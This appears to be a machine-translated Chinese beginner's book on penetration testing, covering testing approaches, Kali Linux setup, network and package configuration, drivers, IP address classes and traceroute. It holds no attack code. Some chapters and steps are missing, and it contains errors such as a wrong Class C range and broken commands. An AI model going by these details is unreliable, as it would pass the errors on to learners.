## 第一章渗透测试简介
![](img/Image00002.jpg)

黑客（Hacking）通常定义为获取对受安全保护系统的访问。黑客一直存在于网络进化之中。以前黑客主要用于从其他国家窃取军事报告。随着时间的推移，互联网普及为黑客提供了轻松获取数据和数字货币的机会。虽然有不同类型的黑客，但这个词在流行文化中经常被用作负面词。

黑客是一门艺术。利用是一项技能。在如今充满恶意木马和阴暗网站的 21 世纪，消费者的安全对于大小任意网站来说都是一个重要问题。这就是为什么每家跨国公司都部署了数百名渗透测试员来不断监控和测试他们的资源。许多安全专家还担任漏洞赏金猎，以此赚钱并确保网站和应用程序的安全。你可以在此处查看更多关于漏洞赏金的信息。

### 什么是渗透测试？
渗透测试是一种安全测试方法和评估策略，通过模拟恶意黑客的攻击方法来发现计算机网络系统的安全性。通过实施渗透测试，可以发现主机中潜在但未公开的安全问题。在接下来的步骤中，用户/开发者可以根据测试结果整合并改进系统的缺陷和安全漏洞，使用户系统变得更加安全。

当伦理黑客实施渗透测试时，他们会使用三种方法：黑盒测试、白盒测试和灰盒测试。本节将分别介绍这三种测试方法。

### 黑盒测试
黑盒测试被称为外部测试。在这种测试方式中，渗透测试员将从远程网络位置评估目标网络基础设施，而没有任何关于目标网络内部拓扑的任何信息。他们模拟网络环境中的外部攻击者，使用流行的攻击技术和工具逐步渗透并入侵目标组织，揭示目标网络中已知或未知的安全漏洞，并进一步评估这些漏洞是否可以被利用来获取控制权或运营业务，导致资产损失。

黑盒测试的缺点是测试耗时耗力，且要求渗透测试员具有较高的技术能力。优点是这种测试更有于挖掘系统的潜在漏洞、薄弱环节和弱点。

### 白盒测试
白盒测试被称为内部测试。白盒渗透测试员在测试之前会学习有关目标环境的所有内部和底层信息。这使得渗透测试员能够以最低成本发现并验证系统中最严重的漏洞。白盒测试的实施过程与黑盒测试相似，不同之处不需要目标位置和情报收集。渗透测试员可以使用正常通道从被测试组织获取各种信息，例如网络拓扑、员工信息，甚至是网站程序的代码片段，并可以与该单位的其他员工进行面对面的交流。

白盒测试的缺点是它无法测试客户组织的应急响应程序，无法判断其安全防护计划针对特定攻击的检测效率。白盒测试的优点是发现和解决安全漏洞所需的时间和成本比黑盒测试少得多。

### 灰盒测试
灰盒测试是白盒测试和黑盒测试的基本结合，可以对目标系统提供更深入、更全面的安全审查。这种结合的优点是可以同时利用这两种渗透测试方法的优点。在使用灰盒测试方法的外部渗透攻击场景中，渗透测试员需要从外部渗透目标网络。然而，目标网络的底层拓扑和架构将有助于更好地选择攻击路径和方法，以获得更好的渗透测试结果。

### 渗透测试流程
在用户清楚理解渗透测试的概念后，他们就可以开始渗透目标。在详细实施渗透测试之前，我们首先介绍其工作流。总共有 5 个阶段，即初步交互、信息收集、漏洞扫描、漏洞利用和报告编写。为了方便用户更清楚地理解每个阶段获得的信息，这里将介绍每个阶段的作用。

1) **早期交互**：在进行渗透测试之前，渗透测试员需要彻底熟悉渗透测试目标、渗透测试范围、渗透测试方法、服务合同等细节以达成共识。这一阶段是后续渗透测试的基础和关键。
2) **信息收集**：在确定渗透测试的目标和范围后，下一步是进入信息收集阶段。在此阶段，渗透测试员需要利用各种公共资源获取尽可能多关于测试目标的信息。在此期间，渗透测试员可以使用互联网收集信息，例如官方网站、论坛和博客。同时，你也可以使用主要的搜索引擎获取相关信息，如 `Yahoo` 和 `Google`。你还可以使用 `Kali Linux` 中的一些工具收集 DNS 信息、注册者信息、服务信息、WAF 信息。此阶段收集的信息越充分，对后续渗透测试就越有利，渗透测试的成功率也将大大提高。正如一位著名的渗透测试员所说：“想成为一名优秀的渗透测试员，就要花 70%的时间收集收集上。”
3) **漏洞扫描**：在渗透测试员收集了足够信息后，对目标进行漏洞扫描。在此阶段，渗透测试员通过网络探测目标系统，向其发送数据，并与内置的漏洞数据库进行匹配，然后列出目标系统的安全漏洞。
4) **漏洞利用**：渗透测试员检测到目标主机的漏洞后，可以通过现有的漏洞利用程序渗透目标系统。通常，渗透测试员需要考虑目标环境对利用程序进行修改和额外的研究，否则它无法正常工作。
5) **编写报告**：完成渗透测试后，你需要为这次渗透测试编写测试报告。准备好的报告需要包含获取的所有价值信息，以及发现的安全漏洞、成功的攻击过程，以及对业务的影响和后果分析。同时，有必要地列出目标系统的漏洞及其修复方法。通过这种方式，目标用户可以根据渗透测试员提供的报告修复这些漏洞和风险。

### Kali Linux 系统概述
Kali Linux 是一个基于 `Debian` 的 Linux 发行版，包含许多安全和取证相关的工具。它由 Offensive Security Ltd 维护和资助。本节将介绍使用 Kali Linux 的原因以及内核的发展历史。如果你想使用 Kali Linux 系统进行渗透测试，必须先安装该系统。在个人电脑上安装这个发行版有一定的难度。因此，我们专门提供了一个章节来帮助你理解安装 Kali Linux 的步骤。

### 为什么要使用 Kali Linux？
Kali Linux 主要为数字取证和渗透测试专家发布。在中使用 Kali Linux 系统实施渗透测试主要有两个原因。




# 1. 工具仓库

Kali Linux 系统提供了一个强大的工具仓库，并预装了许多渗透测试软件，例如 `Nmap`（端口扫描器）、`Wireshark`（包分析器）、`John the Ripper`（密码破解器）和 `Aircrack-ng`（无线局域网渗透测试软件）。如果用户使用其他操作系统，需要手动安装相关工具。渗透测试通常大量的工具，收集这些工具并非易事，且代码安全性也无法保证。此外，如果用户手动安装，可能需要配置复杂的环境。如果用户想要更简单、快速地实现渗透测试，Kali Linux 是最佳选择。如果你对 Kali Linux 不满意，还有一个名为 Parrot Linux 的安全专家替代方案。然而，本书将使用 Kali Linux 来介绍攻击概念。

# 2. 持续更新

Kali Linux 系统的更新速度较快，稳定版每 3 个月更新一次，每周会发布更新版本。因此，用户可以随时更新并尽早使用新系统和最新工具。此外，操作系统的更新非常方便，无需用户手动更新。

### Kali Linux 的历史

为了让读者对 Kali Linux 系统有更深入的了解，在这里我们将介绍它的发展历史。

#### 1) 曾称为 BackTrack Linux

BackTrack Linux 是一套专业的计算机安全监控 Linux 操作系统，简称 `BT`。BackTrack 不仅用作监控平台（WarDriving），还集成了超过 200 种安全渗透工具，包括 `Metasploit`。此外，大量的 RFID 工具以及对 `ARM` 平台的支持也是它的亮点。目前，BackTrack 已被 Kali Linux 取代且不再进行维护。

#### 2) 历史版本

Kali Linux 自发布以来有 4 个版本代码，即 `moto`、`kali`、`sana` 和 `kali-rolling`。其中，每个版本代码代表 Kali Linux 的一个不同版本。用户可以通过修改软件源中的版本代码来更新到对应版本的系统。

## 下载 Linux 镜像
要在你的计算机上安装 Kali Linux 操作系统，你需要获取系统的镜像文件。为了避免下载过程中出现数据传输错误，建议读者也验证其完整性。

### 如何获取 Kali Linux 镜像？
在获取镜像之前，用户需要对 Kali Linux 系统的镜像有一个简单的了解，例如它的版本、架构、桌面类型。然后，我们需要选择下载合适的镜像来安装到系统中。

1) **镜像类型**：Kali Linux 官方提供两个镜像文件，一个是稳定发布版，另一个是每周更新版。在这两者之间，稳定版通常经过了充分测试，更方便使用。每周更新版的优势是其中包含的工具都是最新版本。但它的缺点是测试不足，可能存在不稳定的风险。

2) **数字的区别**：Kali 官方网站提供了 `i386` 和 `amd64` 架构的镜像。其中，`i386`意味着支持 32 位架构的镜像，`amd64`意味着支持 64 位架构的镜像。因此，在下载镜像文件时，用户需要根据自己的系统架构选择相应的镜像文件。
要检查自己的系统架构，Windows 用户可以使用控制面板，Mac OS 用户可以在系统偏好设置中检查。
**注意**：记住 64 位架构可以同时支持 32 位和 64 位镜像。而 32 位架构只能支持 32 位支持镜像。

3) **桌面类型**：Kali Linux 官方网站提供了 6 种桌面镜像。它们分别是 GNOME、X17、KDE、MATE、XFCE 和 LXDE。其中，Gnome 是最常用且易用的桌面环境，因此我们建议你选择 Gnome 桌面来提高你的黑客专业知识。不过，请随意尝试不同的版本，并选择一个你觉得舒服的。

4) **下载镜像**：在用户对 Kali Linux 官方网站提供的所有可用镜像文件有了清晰了解后，可以选择所需的文件进行下载。这里是编写时 Kali Linux 下载页截图。

### 验证 Kali Linux 镜像
由于安装镜像文件通常较大，文件在下载过程中可能会损坏或不完整。如果镜像文件损坏或不完整，安装过程中可能会出错。为了避免这些尴尬的情况，用户可以使用验证工具进行验证。有几个网站可以检查 Linux 文件的真实性。

找到值后，比较并验证获取的值与镜像文件提供的值是否相同。如果相同，则确认镜像文件已完全下载。如果不相同，则是不完整的，可能充满了隐藏的恶意软件。我们建议你从官网重新下载。

## 虚拟机安装
虚拟机指的是通过软件模拟获取具有完整硬件系统功能并在隔离环境中运行的完整计算机系统。对于初学者来说，如果你直接在物理机上安装操作系统，可能会导致系统崩溃或发生数据丢失。因此，为了不仅学习安装系统，而且避免数据丢失，使用虚拟机是更好的方法。市场上上有几十种虚拟机软件。其中，`VirtualBox` 和 `VMware` 是 Windows 可用的两种著名的虚拟机软件。我个人认为 `VMware` 虚拟机简单且更容易操作。我建议用户使用这种虚拟机软件。

下一节将介绍如何使用 VMware 安装和创建 Kali Linux 虚拟机。

如果你想安装 VMware 软件，你需要从其官方网站获取安装包。它有免费版和高级版。

### 安装 VMware
下载 VMware 软件安装包后，用户可以将软件安装到系统中。下节将介绍如何在 Windows 中安装 VMware 软件。

为了实施渗透测试，你需要连接到网络。在实施渗透测试之前，你需要配置网络。用户可以使用有线网络、无线网络和 VPN 连接到网络。本节将介绍这三种网络配置方法。

### 配置有线网络
有线网络是通过同轴电缆、双绞线和光纤连接的计算机网络。简单来说，是通过网线连接的计算机网络，通常被称为 `Ethernet`。有线网络相对稳定。如果用户需要下载某些较大的文件或更新系统，建议使用有线网络。在 Kali Linux 中，用户可以使用命令或图形界面配置有线网络。

#### 1) 使用 `ifconfig` 命令查看现有网络配置
在配置网络之前，首先检查现有的网络配置。如果网络已经配置，则无需再次配置。如果没有配置，则用户需要手动进行配置。
使用 `ifconfig` 命令查看现有的网络配置如下：

```
root@exampleserver:～# ifconfig
```
这将将许多许多关于有线网络的信息。我们建议你保存这些信息的截图，以便以后参考你正在攻击的目标。当你目标是无线网络时，这很有用。

#### 图形界面设置
图形界面设置相对直观且易于操作。下节将介绍在图形界面上设置有线网络的方法。
配置有线网络的具体步骤如下：
1) 打开“设置”面板并选择“网络”（Network）设置项，将显示对话框。
2) 从此对话框可以看出，有线网络未连接。此时，点击设置按钮，将显示对话框。
3) 从对话框中，你可以看到包含 5 个标签，分别是详细信息、标识、`IPv4`、`IPv6` 和安全。这里主要配置 `IPv4` 标签中的选项。设置后，你可以在“详情”（Details）选项卡中查看获取的网络信息。选择 `IPv4` 选项卡，将显示对话框。
4) 在此对话框中设置获取 `IPv4` 地址的方法。这里提供了 4 种方法，即自动 (DHCP)、手动、仅本地链路和 `Disable`（禁用）。其中，“自动 (DHCP)”选项意味着 DHCP 服务器将自动为当前主机分配 IP 地址。“手动”选项意味着用户需要手动设置 IP 地址、子网掩码和网关。“仅本地链路”仅用于无法访问互联网时的本地连接。`Disable` 意味着禁用 IPv4 地址。如果你想访问互联网，必须使用自动 (DHCP) 或手动方法。为了方便使用和快速操作，“自动 (DHCP)”是最佳选择。如果用户想固定当前计算机地址，可以选择“手动”单选按钮，这将显示对话框。
5) 在此对话框中，你可以手动指定 IP 地址、子网掩码、网关、DNS 和路由信息，防止用户因配置错误无法访问互联网。建议只设置 IP 地址和子网掩码。设置后，点击右上角的“应用 (A)”按钮返回网络设置对话框。
6) 此时，有线网络配置完成。但接口尚未激活。因此，用户需要先激活接口才能获取分配的 IP 地址并访问互联网。点击此对话框中的启动按钮连接有线网络。
7) 从此对话框，你可以看到有线网络状态为“已连接”。这显示有线网络配置成功。此时，你可以在“详细信息”选项卡中看到获取的地址信息。
8) 从此对话框，你可以看到有线速度、`IPv4` 和 `IPv6` 地址、硬件地址、默认路由和 DNS 信息。务必勾选接口上的“自动连接”，否则重启电脑后无法自动连接网络。

#### 命令行设置
使用命令行配置网络也非常简单，通过几条命令即可完成配置。Kali 的网络配置文件为 `/etc/network/interfaces`。使用 `VI` 编辑器编辑文件。默认内容如下：

```
root@exampleserver:～# vi /etc/network/interfaces
```
此文件描述了系统的可用接口。可以看到 `lo` 接口是默认配置的。如果你想配置有线网络，添加 `eth0` 信息。同样，用户可以设置动态或静态分配 IP 地址。例如，设置 `eth0` 接口动态获取 IP 地址的方法如下：

```
auto eth0
iface eth0 inet dhcp
```
静态分配 IP 地址的方法如下：

```
auto eth0
iface eth0 inet static
```
用户可以选择适合自己的方法。设置完成后，保存并退出文件。接下来，用户需要重启网络服务使配置生效。执行命令如下：

```
root@exampleserver:～# service networking
```
执行上述命令后，用户可以使用 `ifconfig` 查看信息。

### 配置无线网络
无线网络指的是任何无线网络。计算机需要通过网卡连接网络。如果用户在虚拟机中安装 Kali 并连接物理网络，可以使用网卡。配置无线网络的具体步骤如下：
1) 确定主机是否有无线卡。如果没有无线卡，可以使用 USB 网卡。将 USB 网卡插入主机，使用 `lsusb` 检查无线卡是否被识别。执行命令如下：

```
root@exampleserver:～# lsusb
```
2) 使用 `ifconfig` 命令检查无线接口是否激活：

```
root@exampleserver:～# ifconfig
```
此时，用户可以使用 `ifconfig -a` 查看所有接口。执行上述命令后，如果看到 `wlan0` 接口，意味着网卡识别成功。用户需要使用以下命令激活网卡：

```
root@exampleserver:～# ifconfig wlan0 up
```
执行上述命令后将输出信息。为了判断无线卡是否成功激活，用户可以再次使用 `ifconfig`。
3) 在 Kali 的图形界面中，点击右上角的按钮，将弹出菜单。
4) 从菜单中，你可以看到“已连接 WiFi”、“未连接 WiFi”和“无”等选项。选择“未连接 WiFi”选项，将弹出相关设置。
5) 选择“选择网络”命令查看所有搜索到的 WiFi 网络。
6) 在对话框中，可以设置连接的 WiFi 网络。例如，连接 `Test` 无线网络。首先选择 `Test` 无线网络，然后点击“连接”按钮，将弹出对话框。
7) 在对话框中输入无线网络 `Test` 的身份密码，然后点击“连接”。如果连接成功，可以看到连接的网络名称。

上述方法适用于无线 AP 广播 SSID。很多情况下，用户为了安全会隐藏 SSID。此时，用户在搜索信号中看不到 WiFi 网络。因此用户需要手动添加并连接无线网络。连接隐藏网络的具体步骤如下：
1) 使用 `ifconfig` 命令确认你的无线卡已激活。
2) 选择“WiFi”选项打开对话框。点击右上角的列表按钮。
3) 从此对话框可以看出，有 3 个选项：连接隐藏网络、开启 WiFi 热点和已知 WiFi 网络。这里点击“连接隐藏网络 (C)...”按钮，将显示对话框。
4) 在对话框中输入隐藏 WiFi 网络信息，点击“连接”连接隐藏网络。其中，“网络名称”用于指定网络名称，“WiFi 安全”用于指定无线网络的加密认证方法。系统默认提供 6 种认证方法，即 `WEP40/128 位密钥（十六进制或 ASCII）`、`WEP 128 位密码短`、`LEAP`、`动态 WEP (802.1x)`、`WPA 和 WPA2 个人`、`WPA 和 WPA2 企业`。当用户选择任何加密方法时，都会弹出相应的密码框。在本例中，连接的无线网络名称为 `Test`，加密认证方法为 `WPA-PSK/WPA2-PSK`。
5) 在对话框中输入要连接的隐藏网络信息，点击“连接”按钮。

# 添加软件源

在用户对软件源的概念和格式有清晰了解后，就可以添加软件源。本节将介绍 Kali Linux 中的官方软件源和常用的第三方软件源。

## 1) 官方软件源
Kali Linux 官方源以及由官方重定向的软件源通常相对稳定，但速度不一定快。其中，Kali 的官方源如下：

`deb http://http.kali.org/kali kali-rolling main non-free contrib`

## 2) 常用的第三方软件源
由于 Kali 的官方源是国外网站，国内用户在使用时可能会遇到网络不稳定问题，可能导致软件包安装失败。此外，下载速度仍然较慢。此时，用户可以尝试添加第三方软件源。针对不同的国家和地区有很多镜像站可用。你可以通过快速 Google 搜索找到可用第三方源列表。此外，你也可以使用种子（torrent）发行 Linux 镜像文件。这在任何方面都不是违法的，并且可以帮助你快速下载软件。

## 3) HTTP 和 HTTPS 的选择
出于安全考虑，这些软件源目前支持 `HTTPS` 协议。要使用 `HTTPS` 协议的软件源，只需将 URL 地址中的 `http` 改为 `https` 即可。

`deb https://http.kali.org/kali kali-rolling main non-free contrib`

由于加密问题，`HTTPS` 下载软件的速度较慢，但可以避免缓存服务器的影响。因此，如果用户在安装软件时因为缓存服务器导致下载失败，可以通过将软件源修改为 `HTTPS` 来重新安装软件。

## 4 deb-src 软件源
某些软件不提供二进制包，只提供源代码。对于这类软件，必须添加 `deb-src` 软件源。下载后，它将在用户的计算机上自动编译并生成执行文件。其中，`deb-src` 软件源格式如下：

`deb-src http://http.kali.org/kali kali-rolling main non-free contrib`

# 更新软件源/系统
用户配置好软件源后，需要使用 `apt-get update` 命令更新软件源，使配置生效。用户也可以通过更新软件源来快速更新系统。本节将介绍更新软件源和更新系统的方法。执行命令如下：

```bash
root@exampleserver:～# apt-get update
```

从上面的输出可以看出，软件源已成功更新。执行命令如下：

```bash
root@exampleserver:～# apt-get dist-upgrade R
```

上面的输出信息中显示了更新的包信息，包括要升级的包、新安装的包和已卸载的包。此时输入 `Y` 继续操作。如果后续操作过程中没有错误消息，则系统更新将成功。更新完成后，重启系统，即加载新系统。

用户也可以使用图形界面来更新操作系统。具体步骤如下：

1. 点击左侧收藏夹中的 Show all programs（显示所有程序）按钮打开所有程序界面，并点击 Software（软件）按钮显示对话框。
2. 在此对话框的 Update (U)（更新）选项卡中，可以看到更新提示。此时，点击 Operating System Update（操作系统更新）选项以查看需要更新的软件包。
3. 需要更新的软件包显示在此界面中。此时，点击右上角的关闭按钮返回软件更新对话框。然后，点击 Download (D)（下载）按钮开始下载更新的软件包。下载完成后，将显示对话框。
4. 点击右上角的 Restart and Update（重启并更新）按钮，会弹出 Restart and Install Update（重启并安装更新）对话框。
5. 点击 Restart and Install（重启并安装）重启系统并更新软件包。
6. 此界面显示正在安装的更新包。更新完成后，系统将自动重启。

# 从软件源安装软件
用户配置软件源后，就可以安装软件源中提供的所有软件。本节将介绍安装软件源中的软件。

## 确认包名
用户安装软件时，需要知道包名。如果不确定其名称，可以使用 Kali Linux 中的几个命令来搜索包名。确认包名的方法说明如下。

### 什么是软件包？
软件包指的是具有特定功能以完成特定任务的程序或一组程序。软件包由一个基础组件和若干个可选组件组成，以源代码或目标代码的形式存在。在 Linux 系统中，软件包主要有两种形式，即二进制包和源码包。其中，最常见的二进制包格式是 `deb`（Debian 系列）和 `rpm`（Red Hat 系列）。源码包格式为 `tar.gz`、`tar.bz2` 和 `zip`。

### 根据关键词搜索软件包
在 Kali Linux 中，用户可以使用 `apt-cache` 命令根据关键词搜索软件包。其中，命令的语法格式如下：

`apt-cache search package_name`

根据关键词 `pm-` 搜索包名。

```bash
root@exampleserver:～# apt-cache search "pm-"
```

从输出中可以看出，包含 `pm-` 关键词的所有软件包都已搜索。在上面的信息中，分别显示了软件包的名称和功能。通过分析包信息可以确定已安装的包名。

### 根据命令搜索软件包
Kali Linux 提供了 `apt-file` 工具可以根据命令搜索软件包。但默认没有安装该工具。因此，在使用此工具前需要安装。执行命令如下：

```bash
root@exampleserver:～# apt-get install apt-file
```

执行上述命令后，如果没有报错，则安装成功。接下来可以使用该工具根据命令搜索软件包。语法格式如下：

`apt-file search [pattern]`

搜索软件包 `arpsof`的位置。

```bash
root@exampleserver:～# apt-file search arpsof
```

从输出信息中可以看到名为 `arpsof` 的软件包。

### 查看包结构
用户安装某些软件后，如果不确定软件包安装的位置，可以使用 `apt-file` 命令查看包结构。此外，用户还可以根据包含的文件确认所需的软件包。查看包结构的语法格式如下：

`apt-file list [pattern]`

查看 `dnsenum` 软件包结构：

```bash
root@exampleserver:~# apt-file list dnsenum
```

从输出信息中可以看到 `dnsenum` 的结构。从显示结果可以看到 `dnsenum` 工具安装在 `/usr/bin`。也可以知道帮助文档在 `/usr/share/doc/dnsenum`。

# 安装/更新软件
用户确定软件包名称后即可安装。此外，如果系统中已安装软件，用户也可以更新它。安装和更新软件的方法如下。

## 1) 安装软件
在 Kali Linux 中，`apt-get install` 命令主要用于安装软件。命令语法格式如下：

`apt-get install [package_name]`

以下以 `StarDict` 软件包为例。`StarDict` 是一个著名的字典框架，可以查询单词。当然，用户也可以加入翻译工具，如 Oxford 字典。执行命令如下：

```bash
root@exampleserver:～# apt-get install stardict
```

执行上述命令后，如果没有报错，则 `StarDict` 工具安装成功。此时，用户可以将其他翻译工具的词典文件（`.dict`, `.idx`）拷贝到 `/usr/share/stardict/dic` 目录。

## 2) 更新软件
如果软件已更新但 Kali Linux 中仍在使用旧版本，用户可以通过重新安装软件来尽快体验新功能。例如，更新 `wpscan` 工具，执行命令如下：

```bash
root@exampleserver:～# apt-get install wpscan
```

从上面的输出信息可以看出，软件包已升级。从显示结果可以看到 `wpscan` 工具已从版本 3.4 升级到 3.5。上述方法仅更新特定软件。如果用户想更新所有软件，执行命令如下：

```bash
root@exampleserver:～# apt-get upgrade
```

执行上述命令后，当前系统中需要升级的所有软件包将会被升级。

## 删除软件
当用户不需要某个软件时，可以删除。删除软件的语法格式如下：

`apt-get remove [package_name]` # 卸载包
或
`apt-get purge [package_name]` # 卸载并清除包配置

卸载 `apt-file` 软件。执行命令如下：

```bash
root@exampleserver:～# apt-get remove apt-file
```

看到上面的输出信息意味着 `apt-file` 软件已成功卸载。

# 第 7 章 Kali 中的第三方软件安装
![](img/Image00002.jpg)
Kali Linux 系统默认安装许多渗透测试软件。但某些渗透测试工具未安装（如 `Nessus`），需要下载并安装。通常获取的软件包格式包括 `.deb`、`.tar.gz`、`.tar.bz2` 和 `.zip`。为了满足需要，本节将介绍这些格式软件包的安装方法。

## 安装二进制软件
二进制包包含编译好的程序，可以直接运行。用户只需下载并解压（安装）即可。在 Linux 系统中，二进制软件有两种格式：`RPM` 是基于 Red Hat 发行版的后缀 `.rpm`，而 `DEB` 是基于 Debian 的后缀 `.deb`。Kali Linux 基于 Debian，因此其二进制包格式为 `.deb`。以下介绍安装方法。

1. 下载与操作系统架构相同的二进制包。例如 `Nessus` 的下载地址为 `https://www.tenable.com/downloads/nessus`。示例下载的包名为 `nessus-8.3.1-debianamd64.deb`。
2. 安装 `Nessus` 工具。执行命令如下：

```bash
root@exampleserver:～# dpkg -i nessus-8.3.1-debianamd64.deb
```

看到上面的输出信息意味着 `Nessus` 工具已安装。接下来用户可以使用该工具进行漏洞扫描。

## 安装源码包
源码包包含源代码，需要用户编译生成可运行程序。在 Linux 中，常见的源码包格式是 `.tar.gz` 和 `.tar.bz2`。如果要安装这些包，需要使用 `tar` 命令解压，然后配置并安装。解压 `.tar.gz` 源码包的语法格式如下：

`tar zxvf source file [-C target directory]`

解压 `.tar.bz2` 源码包的语法格式如下：

`tar jxvf source file [-C target directory]`

# 第 8 章 驱动安装
![](img/Image00002.jpg)
驱动是添加到操作系统的特殊程序。驱动包含硬件设备信息，这些信息使计算机能够与相应设备通信。当计算机添加硬件设备时，必须安装相应的驱动，否则设备无法使用。对于 Kali Linux 系统，由于内核较新，可以支持大多数设备驱动。但对于某些设备，用户有时需要手动安装驱动，例如显卡驱动。本节介绍如何查看设备驱动信息并安装驱动。

## 查看设备
安装驱动前，用户可以使用 `lsusb` 和 `lspci` 命令查看 USB 或 PCI 设备的详细信息，以判断驱动是否已正确加载。

### a) 查看 USB 设备
用户实现无线测试时，通常需要 USB 网卡。当用户将设备连接到系统时，可以使用 `lsusb` 命令查看设备列表：

```bash

```

上述输出信息显示了 USB 设备列表。输出信息包括总线号、设备号和厂商 ID。通过分析厂商 ID，可以知道设备是 Realtek Semiconductor（瑞昱半导体）的 USB 设备。用户还可以使用 `lsusb -v` 命令查看设备详情：

```bash
root@exampleserver:～# lsusb -v
```

执行上述命令后，由于空间限制，仅给出了第一个 USB 设备的详细信息。从输出信息可以看到 USB 设备。

### b) 查看 PCI 设备
PCI（外设组件互连）是目前个人电脑最广泛使用的接口，几乎所有主板都有 PCI 设备，如声卡、网卡和显卡。Kali Linux 提供 `lspci` 命令查看系统中的 PCI 设备列表。执行命令如下：

```bash
root@exampleserver:～# lspci
```

上述输出信息显示了系统中的所有 PCI 设备。从输出信息可以看到 PCI 设备如主板芯片、插槽、显卡。用户可以使用带有 `-v` 选项的 `lspci` 命令确认设备是否正确驱动，执行命令如下：

```bash
root@exampleserver:～# lspci -v
```

执行上述命令后，可以看到 PCI 设备的详细信息。从输出信息可以看到每个 PCI 设备的驱动。例如，当前系统的显卡驱动为 `gfx`。

### c) 虚拟机使用 USB 设备
用户实现无线测试时，必须使用网卡。但通常系统内置网卡不支持无线监控，因此用户必须通过 USB 网卡来实现。如果是物理机，用户可以直接插入 USB 设备；如果是虚拟机，用户需要手动连接并启动虚拟机的 USB 服务（VMware USB Arbitration），否则无法识别连接设备。本节以 USB 网卡为例介绍在虚拟机中使用 USB 设备的方法。具体步骤如下：

1. 虚拟机 USB 服务。右键点击桌面上的 Computer（计算机）图标，选择 Manage（管理）|Services and Applications（应用程序和服务）|Services 命令打开菜单。
2. 在服务中找到 VMware USB Arbitration Service，并确认服务已启动。接下来将 USB 网卡插入物理机，会弹出对话框。检测到一个新 USB 设备，名为 `Ralink 802.11n NIC`。此时，用户可以选择连接到主机或虚拟机。选择连接方法后，点击 OK 按钮连接。如果用户选择 Connect to a virtual machine（连接到虚拟机）按钮，可以通过 USB 设备连接到虚拟机。如果选择 Connect to Host（连接到主机）按钮，然后选择虚拟机菜单中的 Removable Device（可移动设备），也可以连接设备到虚拟机。
4. 在菜单栏选择 Realtek 802.11n NIC | Connect (disconnect from the host)（连接（断开主机连接）(C) 命令，弹出对话框。
5. 从对话框可以看到 USB 设备将从主机拔掉并连接到虚拟机。此时点击 OK 按钮成功连接 USB 网卡到虚拟机。接下来，用户可以使用 USB 网卡连接无线网络或进行无线测试。

# 1. IP 地址规则

IP 地址（网协议地址）是一种互联网身份地址，用于识别设备、网络以及更大型的网络。例如，你的手机有一个 IP 地址，而你的调制解器有一个独立且唯一的 IP 地址。它是一个 32 位的二进制数，使用点分法分为 4 个 8 位的二进制数，共 4 个字节。需要的是，IP 地址通常以“点十进制法”的形式表示为 `a.b.c.d`。其中，`a`、`b`、`c` 和 `d` 都是 0 到 255 之间的十整数。例如，点十进制 IP 地址 `192.168.12.143` 实际上是一个 32 位的二进制数。

练习：使用在线转换器找出上述 IP 数字的二进制表示。

IP 地址由两部分组成，即网络地址和主机地址。网络地址表示它属于互联网上的哪个网络，主机地址则表示它属于网络中的哪一个主机。如果你仔细观察，可以发现它们之间存在主从关系。根据不同的网络号和主机号，IP 地址分为 A 类（1.0.0.0～126.0.0.0）、B 类（128.1.0.0～191.255.0.0）和 C 类（192.0.1.0～223.255.255.0）。此外，还有 D 类和 E 类特殊地址类。另外，全 0 和全 1 也被预留。每组 IP 地址的介绍如下：

### A 类
该组的地址范围为 `1.0.0.0-126.0.0.0`，子网掩码为 `255.0.0.0`。在此地址中，第一个字节字节是网络号，最后 3 个字节是主机号。这类 IP 地址的前导位是 `0`，因此可以看出地址的网络号范围从 1 到 126。

### B 类
地址范围从 `128.1.0.0` 到 `191.255.0.0`，指定的子网掩码为 `255.255.0.0`。在此地址中，前两个字节是网络号，后两个字节是主机号。这类 IP 地址的前导位是 `10`，因此网络号范围从 128 到 191。

### C 类
地址范围从 `192.0.1.0` 到 `223.255.255.0`，子网掩码为 `255.255.255.0`。在此地址中，前 3 个字节是网络号，最后一个字节是主机号。这类 IP 地址的前导位是 `110`，因此地址的网络号在 129 到 223 之间。

### D 类
这是一种组播地址。这类 IP 地址的前导位是 `1110`，因此地址的网络号在 224 到 239 之间。通常用于组播用户。如果你不了解，组播地址是允许源设备向一组设备发送数据包的地址。属于组播组的设备将被分配一个组播 IP 地址，组播地址范围为 `224.0.0.0～239.255.255.255`。由于组播地址代表一组设备，它只能用作数据包的目标地址。源地址总是单播地址。组播 MAC 地址以十六进制值 `01-00-5E` 开头，剩余的 6 位十六进制数字由 IP 组播地址的最后 23 位转换而来。

### E 类




保留地址。这种类型 IP 地址的开头是 `1111`，因此地址范围的网络号从 `240` 到 `255`。在 IP 地址中，还有一种特殊类型的 IP 地址，被称为广播地址。广播地址是一种专门用于同时向网络中所有主机发送消息的地址。在运行 TCP/IP 协议的网络中，主机标识段全为 1 的 IP 地址即为广播地址，需要注意的是，广播包会传输到所有涉及主机标识段的计算机。

IP 地址主要根据子网掩码分为网络段。例如，如果 IP 地址 `192.168.1.100/24` 对应的子网掩码为 `255.255.255.0`，则网络段为 `192.168.1.0-255`，也就是说该网络段中有 256 个主机。

当用户发现一个主机时，可以通过掩码格式指定网络范围。其中，为了输入方便，通常使用 CIDR 格式来指定整个子网。CIDR 格式由两部分组成：网络地址和子网掩码，用斜杠（`/`）分隔。如果用户不确定对应 IP 范围的子网掩码格式，可以使用 Net-mask 工具来实现。可以说该工具可以在 IP 范围、子网掩码、CIDR、Cisco 等格式之间进行转换，并提供点进制、十六进制、八进制和二进制 IP 地址之间的转换。

## 确定网络拓扑

用户可以根据路由条目确定上级网络范围。在渗透测试中，通过确定网络拓扑，可以判断目标是局域网还是外部网络。这样就可以针对性地选择渗透测试工具，从而提高渗透测试的效率。本节将介绍使用 `Trace-route` 工具获取目标主机的路由条目，以确定网络拓扑。

使用该工具实现路由跟踪的语法格式如下：
```
traceroute [Target]
```
这里，`target` 是我们尝试查找信息的宿主机网络地址。

**使用场景：**
使用 `Trace-route` 工具追踪目标主机 `72.132.234.64` 的路由以确定其网络拓扑。
执行命令如下：
```
root@exampleserver:～# traceroute 72.132.234.64
```
这将详细显示关于该特定主机的结果。如果你实际运行此命令，计算机屏幕上会弹出很多内容。这些信息大部分是关于数据包以及它们选择的路由的。高级安全研究人员在攻击场景期间分析这些数据包标记，以检查黑客是否在服务器上留下了任何指纹。

**注意：** 在虚拟机的 NAT 模式下，`Trace-route` 的操作会出现问题，无法显示上级路由信息。在工作时请确保了解这一点。

## 第 10 章 扫描主机

![](img/Image00004.jpg)

